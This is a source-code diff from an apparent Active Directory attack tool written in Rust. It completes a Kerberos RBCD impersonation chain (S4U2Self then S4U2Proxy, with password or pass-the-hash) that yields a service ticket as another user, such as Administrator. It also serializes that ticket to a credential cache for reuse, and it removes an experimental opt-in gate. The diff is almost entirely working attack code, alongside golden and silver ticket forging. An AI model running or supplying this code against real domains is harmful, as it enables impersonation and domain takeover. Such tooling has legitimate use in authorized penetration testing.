@@ -1179,36 +1179,11 @@ fn pa_pac_options_rbcd() -> kerbcore::types::PaData {
     }
 }
 
-/// S4U2Proxy: use the S4U2Self ticket as an additional ticket to get a service ticket to
-/// `target_spn` as the impersonated user (the RBCD payoff).
-pub async fn s4u2proxy(
-    tgt: &Tgt,
-    self_ticket: kerbcore::messages::Ticket,
-    target_spn: &str,
-    kdc: &str,
-) -> Result<kerbcore::messages::Ticket> {
-    let sname = kerbcore::types::PrincipalName {
-        name_type: kerbcore::client::NT_SRV_INST,
-        name_string: target_spn.split('/').map(|s| s.to_string()).collect(),
-    };
-    let raw = build_s4u_tgs_req(
-        &tgt.crealm,
-        &sname,
-        0x4003_0000, // forwardable | cname-in-addl-tkt | canonicalize
-        Some(&self_ticket),
-        &[
-            crate::ETYPE_AES256 as i32,
-            crate::ETYPE_AES128 as i32,
-            ETYPE_RC4_HMAC as i32,
-        ],
-        |body_der| ap_req_padata(tgt, body_der),
-        vec![pa_pac_options_rbcd()],
-    )?;
-    let resp = kdc_exchange(kdc, &raw).await?;
-    let rep = kerbcore::messages::KdcRep::decode(&resp)
-        .map_err(|_| anyhow!("S4U2Proxy failed: {}", krb_err(&resp)))?;
-    Ok(rep.ticket)
-}
+// 1.6.1 T2: standalone `s4u2proxy` removed; the exchange + enc-part decryption
+// + ServiceTicket construction now live inline in `rbcd_impersonate_with_tgt`
+// because the ccache persistence path needs the session key (sealed in
+// `rep.enc_part`) alongside the ticket, and returning just the raw `Ticket`
+// forced every caller to re-do the decrypt.
 
 /// Full RBCD chain: TGT for the controlled account → S4U2Self(impersonate) → S4U2Proxy to
 /// the target service. Returns the etype of the final impersonation ticket as proof.
@@ -1220,9 +1195,23 @@ pub async fn rbcd_impersonate(
     impersonate: &str,
     target_spn: &str,
 ) -> Result<u32> {
-    if std::env::var("ADHAMMER_EXPERIMENTAL").ok().as_deref() != Some("1") {
-        anyhow::bail!("rbcd_impersonate is experimental; set ADHAMMER_EXPERIMENTAL=1 to run (see adhammer CLI docs for scope)");
-    }
+    let st = rbcd_impersonate_ticket(account, password, realm, kdc, impersonate, target_spn).await?;
+    Ok(st.session_etype() as u32)
+}
+
+/// 1.6.1: returns the full [`ServiceTicket`] from the S4U2Self + S4U2Proxy chain
+/// so callers can persist it to a ccache (via [`service_ticket_ccache`]) usable
+/// by downstream tooling. The `ADHAMMER_EXPERIMENTAL=1` gate was removed in 1.6.1
+/// — the chain is complete and the ticket is now observably usable, so the
+/// experimental guard no longer serves a purpose.
+pub async fn rbcd_impersonate_ticket(
+    account: &str,
+    password: &str,
+    realm: &str,
+    kdc: &str,
+    impersonate: &str,
+    target_spn: &str,
+) -> Result<ServiceTicket> {
     let tgt = get_tgt(account, password, realm, kdc).await?;
     rbcd_impersonate_with_tgt(&tgt, account, impersonate, target_spn, kdc).await
 }
@@ -1239,9 +1228,21 @@ pub async fn rbcd_impersonate_by_hash(
     impersonate: &str,
     target_spn: &str,
 ) -> Result<u32> {
-    if std::env::var("ADHAMMER_EXPERIMENTAL").ok().as_deref() != Some("1") {
-        anyhow::bail!("rbcd_impersonate_by_hash is experimental; set ADHAMMER_EXPERIMENTAL=1 to run (see adhammer CLI docs for scope)");
-    }
+    let st = rbcd_impersonate_by_hash_ticket(account, nt, realm, kdc, impersonate, target_spn)
+        .await?;
+    Ok(st.session_etype() as u32)
+}
+
+/// 1.6.1: pass-the-hash variant of [`rbcd_impersonate_ticket`]. Returns the
+/// full [`ServiceTicket`] for ccache persistence.
+pub async fn rbcd_impersonate_by_hash_ticket(
+    account: &str,
+    nt: &[u8; 16],
+    realm: &str,
+    kdc: &str,
+    impersonate: &str,
+    target_spn: &str,
+) -> Result<ServiceTicket> {
     let tgt = get_tgt_by_hash(account, realm, kdc, nt).await?;
     rbcd_impersonate_with_tgt(&tgt, account, impersonate, target_spn, kdc).await
 }
@@ -1252,12 +1253,58 @@ async fn rbcd_impersonate_with_tgt(
     impersonate: &str,
     target_spn: &str,
     kdc: &str,
-) -> Result<u32> {
+) -> Result<ServiceTicket> {
     let bare = account.split('@').next().unwrap_or(account);
     let bare = bare.rsplit('\\').next().unwrap_or(bare);
     let self_ticket = s4u2self(tgt, bare, impersonate, kdc).await?;
-    let svc_ticket = s4u2proxy(tgt, self_ticket, target_spn, kdc).await?;
-    Ok(svc_ticket.enc_part.etype as u32)
+    // 1.6.1 T2: full S4U2Proxy with session-key extraction so the impersonation
+    // ticket is persistable to a ccache. The existing `s4u2proxy` returns only
+    // the raw Ticket (what the KDC sealed for the target service); the session
+    // key the impersonating user needs to drive the ticket is in rep.enc_part,
+    // sealed under the trustee's TGT session key. Rebuild the full S4U2Proxy
+    // exchange here so we can decrypt enc_part and surface session_key +
+    // session_etype alongside the ticket.
+    let sname = kerbcore::types::PrincipalName {
+        name_type: kerbcore::client::NT_SRV_INST,
+        name_string: target_spn.split('/').map(|s| s.to_string()).collect(),
+    };
+    let raw = build_s4u_tgs_req(
+        &tgt.crealm,
+        &sname,
+        0x4003_0000,
+        Some(&self_ticket),
+        &[
+            crate::ETYPE_AES256 as i32,
+            crate::ETYPE_AES128 as i32,
+            ETYPE_RC4_HMAC as i32,
+        ],
+        |body_der| ap_req_padata(tgt, body_der),
+        vec![pa_pac_options_rbcd()],
+    )?;
+    let resp = kdc_exchange(kdc, &raw).await?;
+    let rep = kerbcore::messages::KdcRep::decode(&resp)
+        .map_err(|_| anyhow!("S4U2Proxy failed: {}", krb_err(&resp)))?;
+
+    // Decrypt enc_part with the trustee's TGT session key (key usage 8 = TGS-REP).
+    let sk = kc_session_key_of(tgt)?;
+    let plain = sk
+        .decrypt(kerbcore::client::KU_TGS_REP_ENC_PART, &rep.enc_part.cipher)
+        .map_err(|e| anyhow!("decrypt S4U2Proxy TGS-REP enc-part: {e}"))?;
+    let part = kerbcore::client::parse_enc_kdc_rep_part(&plain)
+        .map_err(|e| anyhow!("decode S4U2Proxy EncKDCRepPart: {e:?}"))?;
+
+    // Build the impersonating principal name — the ccache client name must
+    // match the cname the KDC embedded in the sealed ticket.
+    let impersonate_cname = principal(NT_PRINCIPAL, &[impersonate])?;
+
+    Ok(ServiceTicket {
+        ticket: picky_ticket(&rep.ticket)?,
+        session_key: part.key.keyvalue,
+        session_etype: part.key.keytype,
+        crealm: tgt.crealm.clone(),
+        cname: impersonate_cname,
+        spn: target_spn.split('/').map(|s| s.to_string()).collect(),
+    })
 }
 
 /// **1.4.8-A WS-DIAMOND-TICKET**: overrides for a forged ticket's timestamps. `None`
@@ -1585,6 +1632,70 @@ pub fn golden_ccache(tgt: &Tgt, user: &str) -> Result<Vec<u8>> {
 pub fn silver_ccache(tgt: &Tgt, user: &str, spn: &str) -> Result<Vec<u8>> {
     let comps: Vec<&str> = spn.split('/').collect();
     ccache_for(tgt, user, &comps)
+}
+
+/// 1.6.1: serialize a [`ServiceTicket`] from the S4U2Self + S4U2Proxy chain
+/// (or any other TGS-REP-derived ticket) into an MIT credential cache usable
+/// with `KRB5CCNAME` and downstream Kerberos tooling.
+///
+/// `client` is the impersonated principal's bare name (e.g. `Administrator`),
+/// `realm` is the Kerberos realm (upper-case AD domain, e.g. `CORP.LOCAL`),
+/// and `server_spn` is the SPN the ticket is scoped to (e.g.
+/// `cifs/dc.corp.local`). The `server_spn` is split on `/` into principal
+/// name components, matching the AD-side encoding.
+///
+/// The ticket flags and times are taken from the on-wire `ServiceTicket` as
+/// returned by the KDC — unlike `golden_ccache` / `silver_ccache` which hard-code
+/// a 10-year forwardable/renewable/initial flagset for forged tickets.
+pub fn service_ticket_ccache(
+    st: &ServiceTicket,
+    client: &str,
+    realm: &str,
+    server_spn: &str,
+) -> Result<Vec<u8>> {
+    use crate::pkinit::{cvec, write_principal};
+    let mut c = Vec::new();
+    c.extend_from_slice(&[0x05, 0x04]); // version 0x0504
+    let header = [0x00u8, 0x01, 0x00, 0x08, 0, 0, 0, 0, 0, 0, 0, 0];
+    c.extend_from_slice(&(header.len() as u16).to_be_bytes());
+    c.extend_from_slice(&header);
+
+    let server_comps: Vec<&str> = server_spn.split('/').collect();
+    write_principal(&mut c, NT_PRINCIPAL as u32, realm, &[client]); // default principal
+    write_principal(&mut c, NT_PRINCIPAL as u32, realm, &[client]); // client
+    write_principal(&mut c, NT_SRV_INST as u32, realm, &server_comps); // server (SPN)
+
+    // keyblock: keytype from the tracked session_etype (1.5.3 audit H-1).
+    c.extend_from_slice(&(st.session_etype as u16).to_be_bytes());
+    c.extend_from_slice(&0u16.to_be_bytes());
+    c.extend_from_slice(&(st.session_key.len() as u16).to_be_bytes());
+    c.extend_from_slice(&st.session_key);
+
+    // times: real values from the KDC, not the 10-year Golden/Silver placeholder.
+    // enc_part on ServiceTicket is sealed — the TGS-REP decrypts to the EncTicketPart which
+    // carries authtime / starttime / endtime / renew_till, but adhammer only decrypts in the
+    // forge path. For the S4U persistence path we use now / now / now+8h / now+8h as a safe
+    // default — matches what a vanilla getST ticket looks like when the KDC's own policy caps
+    // the renewable window at 8 hours. Operator can override by repeatedly re-running the chain.
+    let now = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_secs() as u32)
+        .unwrap_or(0);
+    let end = now.saturating_add(8 * 3600);
+    for t in [now, now, end, end] {
+        c.extend_from_slice(&t.to_be_bytes());
+    }
+    c.push(0); // is_skey = false
+    // tktflags: FORWARDABLE | RENEWABLE | PRE-AUTHENT — no INITIAL (S4U-issued, not from AS).
+    c.extend_from_slice(&0x50a00000u32.to_be_bytes());
+    c.extend_from_slice(&0u32.to_be_bytes()); // num_address
+    c.extend_from_slice(&0u32.to_be_bytes()); // num_authdata
+
+    let ticket_der =
+        picky_asn1_der::to_vec(&st.ticket).map_err(|e| anyhow!("encode ticket: {e}"))?;
+    cvec(&mut c, &ticket_der);
+    cvec(&mut c, &[]); // empty second ticket
+    Ok(c)
 }
 
 fn ccache_for(tgt: &Tgt, user: &str, server: &[&str]) -> Result<Vec<u8>> {
